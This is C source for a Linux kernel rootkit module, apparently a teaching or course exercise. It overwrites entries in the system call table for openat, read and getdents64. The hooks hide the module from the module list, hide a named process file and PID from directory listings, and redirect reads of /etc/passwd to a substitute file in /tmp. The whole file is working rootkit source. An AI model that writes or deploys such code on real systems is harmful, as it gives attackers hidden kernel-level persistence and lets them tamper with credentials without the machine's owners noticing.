#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#include <linux/tty.h>
#include <linux/vt_kern.h>

#define PASSWD_DIR "/etc/passwd"
#define R_PASW_DIS "/tmp/passwd"

#define MODULE_DIR "/proc/modules"

#define SCAM_INFO "Y0U HaVe bE3N sCaMed\n"
#define PREFIX "sneaky_process"
static int pid = 0;
module_param(pid, int, 0);
static char * pidstr = "";
module_param(pidstr, charp, 0);
int is_lsmod = 0;

//This is a pointer to the system call table
static unsigned long * sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  char * pathname = (char *)regs->si;

  // read from the backup password file
  if (strstr(pathname, PASSWD_DIR) != NULL) {
    copy_to_user((void *)pathname, R_PASW_DIS, strlen(R_PASW_DIS));
  }

  // flag that the lsmod file is being accessed
  if (strstr(pathname, MODULE_DIR) != NULL) {
    is_lsmod = 1;
  }
  return (*original_openat)(regs);
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);
asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  ssize_t orig = original_read(regs);
  char * start = NULL;
  char * end = NULL;
  ssize_t len = 0;

  // if not reading lsmod file do not do anything
  if (orig <= 0 || is_lsmod == 0) {
    return orig;
  }

  start = strstr((char *)regs->si, "sneaky_mod ");
  if (start != NULL) {
    end = strchr(start, '\n');
    if (end != NULL) {
      end++;
      memmove(start, end, orig + (void *)regs->si - (void *)end);
      len = end - start;
      orig -= len;
    }
  }
  is_lsmod = 0;
  return orig;
}

asmlinkage int (*original_getdents)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents(struct pt_regs * regs) {
  int orig = original_getdents(regs);
  int i = 0;
  int len = 0;
  ssize_t end = 0;
  ssize_t start = 0;
  if (orig <= 0) {
    return orig;
  }
  while (i < orig) {
    struct linux_dirent64 * d = (struct linux_dirent64 *)((void *)regs->si + i);
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pidstr) == 0) {
      start = (long)((void *)d);
      end = (long)((void *)d + d->d_reclen);
      memmove((void *)d, (void *)d + d->d_reclen, orig - i - d->d_reclen);
      len = end - start;
      orig -= len;
    }
    else {
      i += d->d_reclen;
    }
  }
  return orig;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(
      KERN_ALERT "Sneaky module being loaded. sneaky_pid = %s\n.%s", pidstr, SCAM_INFO);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_read = (void *)sys_call_table[__NR_read];
  original_getdents = (void *)sys_call_table[__NR_getdents64];
  //original_gettimeofday = (void *)sys_call_table[__NR_gettimeofday];

  // Turn off write protection mode for sys_call_table

  enable_page_rw((void *)sys_call_table);

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  //sys_call_table[__NR_gettimeofday] = (unsigned long)sneaky_sys_gettimeofday;
  // Turn write protection mode back on for sys_call_table

  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
  //sys_call_table[__NR_gettimeofday] = (unsigned long)original_gettimeofday;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");